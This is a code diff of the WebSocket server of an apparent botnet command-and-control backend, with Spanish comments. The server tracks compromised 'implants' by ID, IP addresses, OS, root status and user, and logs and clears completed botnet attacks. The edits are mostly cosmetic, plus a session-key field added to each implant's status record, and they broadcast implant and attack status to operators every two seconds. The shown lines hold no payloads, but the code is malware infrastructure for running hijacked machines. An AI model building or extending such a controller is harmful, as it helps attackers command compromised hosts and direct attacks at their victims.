@@ -54,7 +54,7 @@ const webSocketsServer = async(httpServer, attacks_running, agents, status_conne
           if(!data_parsed.error) {
             
             if(data_parsed.status === 'attack_completed') {
-              // Filtrar para REMOVER el ataque completado
+              // Filtrar para REMOVER el Attack completed
               // Si el mensaje del implante falla, el controller limpia el estado de running_attacks en el backend
                writeLog(` | Botnet ${data_parsed.attack_type} attack completed`)
                attacks_running.attacks = attacks_running.attacks.filter(a => 
@@ -98,12 +98,13 @@ const webSocketsServer = async(httpServer, attacks_running, agents, status_conne
     const interval = setInterval(async () => {
       const db_clients = await Implant.find(); 
 
-      
+
       const client_db_list = db_clients.map(x => x);
 
       client_db_list.forEach((c) => {
 
         const ws = agents.agents.get(c.impl_id);
+
 /* 
          for (const [clave, valor] of agents.agents) {
           console.log("agents key: ",clave, typeof(clave));
@@ -111,7 +112,7 @@ const webSocketsServer = async(httpServer, attacks_running, agents, status_conne
           console.log(clave.replace(/\s+/g, "").toString() === c.impl_id.replace(/\s+/g, "").toString());
         } */
         const arr_index = status_connections.status_connections.findIndex(i=>i.id.toLowerCase() === c.impl_id.toLowerCase())
-
+        
 
         if(arr_index !== -1){
           
@@ -130,12 +131,12 @@ const webSocketsServer = async(httpServer, attacks_running, agents, status_conne
 
            if (ws) {
             if (ws.isAlive) {
-              status_connections.status_connections.push({ id: c.impl_id, status: 'active', impl_mac: c.impl_mac, group: c.group, public_ip: c.public_ip, local_ip: c.local_ip, operating_system: c.operating_system, root:c.root, user:c.user });
+              status_connections.status_connections.push({ id: c.impl_id, status: 'active', impl_mac: c.impl_mac, group: c.group, public_ip: c.public_ip, local_ip: c.local_ip, operating_system: c.operating_system, root:c.root, user:c.user, sess_key:c.sess_key });
             } else {
-              status_connections.status_connections.push({ id: c.impl_id, status: 'inactive', impl_mac: c.impl_mac, group: c.group, public_ip: c.public_ip, local_ip: c.local_ip, operating_system: c.operating_system, root:c.root, user:c.user });
+              status_connections.status_connections.push({ id: c.impl_id, status: 'inactive', impl_mac: c.impl_mac, group: c.group, public_ip: c.public_ip, local_ip: c.local_ip, operating_system: c.operating_system, root:c.root, user:c.user, sess_key:c.sess_key });
             }
           } else {
-            status_connections.status_connections.push({ id: c.impl_id, status: 'inactive', impl_mac: c.impl_mac, group: c.group, public_ip: c.public_ip, local_ip: c.local_ip, operating_system: c.operating_system, root:c.root, user:c.user });
+            status_connections.status_connections.push({ id: c.impl_id, status: 'inactive', impl_mac: c.impl_mac, group: c.group, public_ip: c.public_ip, local_ip: c.local_ip, operating_system: c.operating_system, root:c.root, user:c.user, sess_key:c.sess_key });
           }
         }
     
@@ -188,13 +189,6 @@ const main_ws_server = async (httpServer, attacks_running, agents, status_connec
       }
 
 
-      // Enviar estados a todos los users conectados
-      const payload = {
-        data: status_connections.status_connections,
-        botnet: attacks_running.attacks,
-        events: readLastLines()
-      };
-
 
 
       socket.on('close', () => {
@@ -213,7 +207,6 @@ const main_ws_server = async (httpServer, attacks_running, agents, status_connec
         events: readLastLines()
       };
 
-      
       // Reenviar a todos los users
       users.forEach(userSocket => {
         if (userSocket.readyState === userSocket.OPEN) {
@@ -221,6 +214,8 @@ const main_ws_server = async (httpServer, attacks_running, agents, status_connec
         }
       });
 
+
+      
 
 
     }, 2000);
